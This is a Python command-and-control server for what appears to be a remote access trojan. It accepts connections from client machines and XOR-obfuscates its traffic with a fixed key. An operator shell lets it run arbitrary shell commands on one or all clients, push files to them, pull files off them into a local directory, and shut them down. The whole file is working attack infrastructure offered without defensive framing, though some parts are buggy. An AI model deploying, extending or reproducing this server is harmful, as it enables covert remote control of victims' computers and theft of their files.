#!/usr/bin/env python3

import cmd
import os
import time
import socket
import threading

HOST = "127.0.0.1"
PORT = 65432
UPLOAD_DIRECTORY = "X:\\tmp\\"

CRYPT_KEY = 33
FILE_SIZE_DIGIT_SIZE = 8
SOCKET_BUFFER_SIZE = 256

class Client:
    address = None
    connection = None
    info = None

clients = []

def EncryptDecryptString(s):
    isString = False
    if isinstance(s, str):
        isString = True
        new_s = ""
    else:
        new_s = bytearray()
        
    i = 0
    for c in s:
        if isString:
            ord_c = ord(c)
        else:
            ord_c = c

        if ord_c != 0:
            res = ord_c ^ CRYPT_KEY
        else:
            res = 0

        if isString:
            new_s += chr(res)
        else:
            new_s.append(res)

        i += 1

    return new_s;

def ThreadRegisterClient(client):
    print("[INFO] Connected to" + str(client.address))
    print("[DEBUG] Client: " + str(client.connection))

    try:
        while True:
            data = client.connection.recv(SOCKET_BUFFER_SIZE)
            if not data:
                break

            print("Got data: " + str(data));
            command = data.decode()
            command = EncryptDecryptString(command)
            
            if command == "login":
                print("[INFO] Got login response. Sending info command...")
                client.connection.send(EncryptDecryptString(b"info"))

                data = client.connection.recv(SOCKET_BUFFER_SIZE)
                if not data:
                    break

                print("[INFO] Got info response...")
                client.info = EncryptDecryptString(data.decode())
                break
            else:
                client.connection.send(EncryptDecryptString(data))
    except socket.timeout:
        print("[EXCEPTION] Connection timed out!")
    except Exception as e:
        print("[EXCEPTION] Unknown exception: " + str(e))

    print("[INFO] Client connected and registered.")

def ThreadStartServer():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print("[INFO] Binding to " + HOST + " and " + str(PORT) + "...")
        s.bind((HOST, PORT))
        print("[INFO] Listening...")
        s.listen()

        while True:
            conn, addr = s.accept()
            with conn:
                conn_dup = conn.dup() # We duplicate the connection because it somehow gets destroyed after starting a new thread

            client = Client()
            client.connection = conn_dup
            client.address = addr
            clients.append(client)

            threading.Thread(target=ThreadRegisterClient,args=(client,)).start()

        s.close()

def ReceiveDataFromClient(client, command):
    client.connection.send(EncryptDecryptString(command.encode()))

    fullData = bytearray()

    receivedFileSize = client.connection.recv(FILE_SIZE_DIGIT_SIZE);
    fileSizeDecoded = EncryptDecryptString(receivedFileSize.decode())
    fileSize = int(str(fileSizeDecoded).strip('\x00'))
    if fileSize > 0:
        totalBytesReceived = 0

        while True:
            data = client.connection.recv(SOCKET_BUFFER_SIZE)
            EncryptDecryptString(data)
            fullData += data

            totalBytesReceived += len(data)
            if totalBytesReceived >= fileSize:
                break;
    else:
        print("[INFO] Received data is zero/empty.")

    return fullData

threading.Thread(target=ThreadStartServer).start()

time.sleep(1)

class ServerShell(cmd.Cmd):
    intro = "Intro"
    prompt = ">> "

    def do_list(self, args):
        "Lists down available clients."

        if len(clients) > 0:
            i = 0
            for c in clients:
                print("Client " + str(i) + ": " + c.info)
                i += 1
        else:
            print("No available clients.\n")

    def do_cmd(self, args):
        "Run command on client."

        args = args.split(" ")
        if len(args) >= 2:
            cleanedCommand = "cmd " + ' '.join(args[1:])
            
            if args[0] == "all":
                for client in clients:
                    receivedData = ReceiveDataFromClient(client, cleanedCommand)
                    print("Received from " + client.info + ":\n" + EncryptDecryptString(receivedData.decode()))
            else:
                try:
                    clientNumber = int(args[0])

                    client = clients[clientNumber]
                    receivedData = ReceiveDataFromClient(client, cleanedCommand)
                    print("Received from " + client.info + ":\n" + EncryptDecryptString(receivedData.decode()))

                except ValueError as e:
                    print("[ERROR] " + str(e))
        else:
            print("[ERROR] Incorrect number of arguments. format:\"cmd [target] [shell_command]\"")

    def do_download(self, args):
        "Download file to client."

        args = args.split(" " )
        if len(args) == 3:
            clientNumber = 0
            try:
                clientNumber = int(args[0])
            except ValueError as e:
                print("[ERROR] " + str(e))

            client = clients[clientNumber]
            client.connection.send(EncryptDecryptString(b"download " + args[2].encode()))

            targetPath = args[1]
            f = open(targetPath, "rb")

            fileSize = os.stat(targetPath).st_size
            fileSizeStr = str(fileSize).rjust(8, '0')
            client.connection.send(EncryptDecryptString(fileSizeStr.encode()))

            if f:
                print("[INFO] Reading received data from " + targetPath)

                while(1):
                    readData = f.read(SOCKET_BUFFER_SIZE)
                    if len(readData) <= 0 or readData == None:
                        break
                    client.connection.send(EncryptDecryptString(readData))

                print("[INFO] DONE SENDING ALL DATA")

                f.close()
            else:
                print("[ERROR] Error opening file for reading.")
        else:
            print("[ERROR] Incorrect number of arguments. format:\"download [target] [file_to_download] [filename_to_use]\"")

    def do_upload(self, args):
        "Upload file from client."

        args = args.split(" ")
        if len(args) == 2:
            clientNumber = 0
            try:
                clientNumber = int(args[0])
            except ValueError as e:
                print("[ERROR] " + str(e))

            client = clients[clientNumber]

            receivedData = ReceiveDataFromClient(client, "upload " + ' '.join(args[1:]))
            receivedData = EncryptDecryptString(receivedData)
            if len(receivedData) > 0:
                filePathSplitted = args[1].split("\\")
                fileName = client.info + "_" + filePathSplitted[len(filePathSplitted) - 1]
                targetPath = UPLOAD_DIRECTORY + fileName
                f = open(targetPath, "wb")
                if f:
                    print("[INFO] Writing received data to " + targetPath)
                    f.write(receivedData)
                    f.close()
                else:
                    print("[ERROR]  Error opening file for writing.")
            else:
                print("[ERROR] Error opening file at " + args[1])
        else:
            print("[ERROR] Incorrect number of arguments. format:\"upload [target] [file_to_upload]\"")

    def do_shutdown(self, args):
        "Shuts down the client."

        args = args.split(" ")
        if len(args) == 1:
            if args[0] == "all":
                for client in clients:
                    client.connection.send(EncryptDecryptString(b"shutdown"))

                    print("[INFO] Closing the connection for " + str(client.address))
                    client.connection.close()

                clients.clear()
            else:
                clientNumber = int(args[0])

                try:
                    client = clients[clientNumber]
                    client.connection.send(EncryptDecryptString(b"shutdown"))

                    print("[INFO] Closing the connection for " + str(client.address))
                    client.connection.close()
                    clients.remove(client)
                except IndexError as e:
                    print("[ERROR] " + str(e))
                
        else:
            print("[ERROR] Incorrect number of arguments. format:\"download [target]\"")
            
ServerShell().cmdloop()
